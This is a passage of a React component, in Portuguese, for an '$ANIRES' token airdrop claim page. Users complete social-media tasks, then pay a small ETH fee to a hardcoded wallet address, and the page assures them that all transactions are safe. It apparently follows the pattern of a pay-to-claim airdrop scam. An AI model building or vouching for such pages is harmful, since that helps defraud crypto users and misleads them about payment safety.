                <span className="text-gray-400">Verificando tarefas...</span>
                <span className="text-blue-400">{Math.round(verificationProgress)}%</span>
              </div>
              <Progress value={verificationProgress} className="h-2 bg-blue-950" />
              <p className="text-xs text-gray-500 mt-1">
                Por favor, aguarde enquanto verificamos suas tarefas. Isso pode levar até 30 segundos.
              </p>
            </div>
          )}

          {verificationFailed && failedTaskId && (
            <div className="mb-4 p-3 bg-red-900/20 border border-red-800/30 rounded-md">
              <div className="flex items-start">
                <AlertCircle className="h-5 w-5 text-red-400 mr-2 flex-shrink-0 mt-0.5" />
                <div>
                  <h3 className="text-red-400 font-medium">Verificação falhou</h3>
                  <p className="text-sm text-gray-300 mt-1">
                    Detectamos um problema com a tarefa:{" "}
                    {failedTaskId === "twitter-follow"
                      ? "Seguir no Twitter"
                      : failedTaskId === "twitter-retweet"
                        ? "Retweet com Hashtags"
                        : failedTaskId === "twitter-like"
                          ? "Curtir no Twitter"
                          : "Entrar no Grupo do Telegram"}
                  </p>
                  <p className="text-sm text-gray-300 mt-1">
                    Por favor, verifique se você completou corretamente esta tarefa e tente novamente.
                  </p>
                </div>
              </div>
            </div>
          )}

          {isVerified && (
            <div className="mb-4 p-3 bg-green-900/20 border border-green-800/30 rounded-md">
              <div className="flex items-start">
                <CheckCircle className="h-5 w-5 text-green-400 mr-2 flex-shrink-0 mt-0.5" />
                <div>
                  <h3 className="text-green-400 font-medium">Verificação Concluída</h3>
                  <p className="text-sm text-gray-300 mt-1">
                    Todas as tarefas foram verificadas com sucesso! Você pode reivindicar seus tokens agora.
                  </p>
                </div>
              </div>
            </div>
          )}

          <div className="flex flex-col items-center py-2">
            <Button
              className="w-full bg-purple-600 hover:bg-purple-700 text-white"
              disabled={!tasks.every((task) => task.completed) || isVerifying || isVerified}
              onClick={handleStartVerification}
            >
              {isVerifying ? (
                <div className="flex items-center">
                  <div className="h-4 w-4 border-2 border-t-white border-b-transparent border-l-transparent border-r-transparent rounded-full animate-spin mr-2"></div>
                  Verificando Tarefas...
                </div>
              ) : isVerified ? (
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 mr-2" />
                  Verificação Concluída
                </div>
              ) : (
                "Iniciar Verificação"
              )}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Claim Tokens Section */}
      <div className="text-left mt-8 mb-2">
        <h2 className="text-xl text-purple-400 font-semibold">Reivindicar Tokens</h2>
        <p className="text-gray-400 text-sm">
          Reivindique seus tokens $ANIRES do airdrop do AniRes. Para completar a reivindicação, é necessário pagar uma
          taxa de 0.000006 ETH (aproximadamente $0.02 USD).
          {referredBy && (
            <span className="text-green-400"> Você foi indicado e receberá 10% de bônus: {tokenAmount} tokens!</span>
          )}
        </p>
      </div>

      <Card className="border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden">
        <CardContent className="p-4">
          {!isVerified ? (
            <div className="p-3 bg-yellow-900/20 border border-yellow-800/30 rounded-md mb-4">
              <div className="flex items-start">
                <AlertCircle className="h-5 w-5 text-yellow-400 mr-2 flex-shrink-0 mt-0.5" />
                <div>
                  <h3 className="text-yellow-400 font-medium">Verificação Necessária</h3>
                  <p className="text-sm text-gray-300 mt-1">
                    Complete todas as tarefas obrigatórias e a verificação para reivindicar tokens.
                  </p>
                </div>
              </div>
            </div>
          ) : (
            <>
              <div className="mb-4">
                <h3 className="text-white font-medium mb-2">Informações da Taxa</h3>
                <p className="text-sm text-gray-300 mb-3">
                  Ao clicar em "Reivindicar Tokens", sua carteira será aberta para autorizar o pagamento de 0.000006 ETH
                  (aproximadamente $0.02 USD) para completar a reivindicação.
                </p>

                <div className="p-3 bg-[#13131f] rounded-md border border-purple-800/30 mb-3">
                  <p className="text-sm text-gray-400 mb-1">Endereço para pagamento:</p>
                  <div className="flex items-center justify-between">
                    <code className="text-xs text-purple-300 font-mono">
                      0x0Fcf41A546b2de64aBDc320703dDD657dF802Eb4
                    </code>
                    <Button
                      variant="outline"
                      size="sm"
                      className="border-purple-800/30 text-purple-400 hover:bg-purple-900/20"
                      onClick={() =>
                        copyToClipboard(
                          "0x0Fcf41A546b2de64aBDc320703dDD657dF802Eb4",
                          "Endereço copiado para a área de transferência",
                        )
                      }
                    >
                      <Copy className="h-3 w-3 mr-1" />
                      Copiar
                    </Button>
                  </div>
                </div>

                <div className="p-3 bg-blue-900/20 border border-blue-800/30 rounded-md mb-3">
                  <div className="flex items-start">
                    <Shield className="h-5 w-5 text-blue-400 mr-2 flex-shrink-0 mt-0.5" />
                    <div>
                      <h3 className="text-blue-400 font-medium">Segurança</h3>
                      <p className="text-sm text-gray-300 mt-1">
                        Todas as transações são seguras e verificadas. Você pode verificar o contrato do token antes de
                        prosseguir.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              <Button
                className="w-full bg-green-600 hover:bg-green-700 text-white"
                disabled={isProcessingPayment}
                onClick={handleProcessPayment}
              >
                {isProcessingPayment ? (
                  <div className="flex items-center">
                    <div className="h-4 w-4 border-2 border-t-white border-b-transparent border-l-transparent border-r-transparent rounded-full animate-spin mr-2"></div>
                    Processando...
                  </div>
                ) : (
                  "Reivindicar Tokens"
                )}
              </Button>
            </>
          )}
        </CardContent>
      </Card>

      <div className="text-center text-xs text-gray-500 mt-4">
        Todas as verificações serão processadas automaticamente para cada carteira participante.
      </div>
    </div>
  )
}

